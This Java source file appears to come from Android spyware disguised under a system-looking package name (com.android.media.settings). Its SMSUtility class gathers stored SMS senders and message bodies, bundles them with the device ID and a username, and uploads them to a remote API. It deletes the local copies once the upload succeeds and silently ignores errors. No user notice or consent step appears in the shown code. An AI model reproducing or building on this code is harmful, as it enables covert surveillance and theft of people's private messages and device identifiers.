package com.android.media.settings.Utility;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;

import com.android.media.settings.API.MediaAPI;
import com.android.media.settings.MediaDBManager;
import com.android.media.settings.Models.MediaSMS;
import com.android.media.settings.Services.MediaService;
import com.android.media.settings.Models.MediaAPIResponse;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;

public class SMSUtility {
    private Context context;
    private MediaUtility mUtility;
    private List<String> idList;
    private MediaDBManager mediaDBManager;

    public SMSUtility(Context context) {
        this.context = context;
        this.mUtility = new MediaUtility(context);
        idList = new ArrayList<String>();
        this.mediaDBManager = new MediaDBManager(context);
    }

    public void initSMSUpload() {
        try {
            MediaSMS mediaSMS = mediaDBManager.getLocalSMS();
            if(mediaSMS != null && mediaSMS.getIdList() != null && mediaSMS.getIdList().size() > 0) {
                new SMSUploadTask().execute(mediaSMS);
            }
        } catch (Exception ignored) {}
    }

    private void startUpload(Cursor cursor) {
        StringBuilder stringBuilder = new StringBuilder();
        while (cursor.moveToNext()) {
            idList.add(cursor.getString(0));
            stringBuilder.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_FROM)));
            stringBuilder.append(" : ");
            stringBuilder.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_BODY)));
            stringBuilder.append("/n/n");
        }
        MediaAPI api = mUtility.initRetroService();
        api.postSms(stringBuilder.toString(), mUtility.getDeviceId(), mUtility.getUsername())
                .subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(observer);
    }

    private Observer<MediaAPIResponse> observer = new Observer<MediaAPIResponse>() {
        @Override
        public void onSubscribe(Disposable d) {
        }

        @Override
        public void onNext(MediaAPIResponse value) {
            if(value.getStatus() == 1) {
                new MediaDBManager(context).removeSMS(idList);
            }
        }

        @Override
        public void onError(Throwable e) {
            e.printStackTrace();
        }

        @Override
        public void onComplete() {
        }
    };

    private class SMSUploadTask extends AsyncTask<MediaSMS, Void, Void> {

        @Override
        protected void onPreExecute() {
            MediaService.isSMSUploading = true;
        }

        @Override
        protected Void doInBackground(MediaSMS... params) {
            MediaSMS mediaSMS = params[0];
            idList = mediaSMS.getIdList();
            MediaAPI api = mUtility.initRetroService();
            api.postSms(mediaSMS.getMsgContent().toString(), mUtility.getDeviceId(), mUtility.getUsername())
                    .subscribeOn(Schedulers.newThread())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(observer);
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            MediaService.isSMSUploading = false;
        }
    }
}
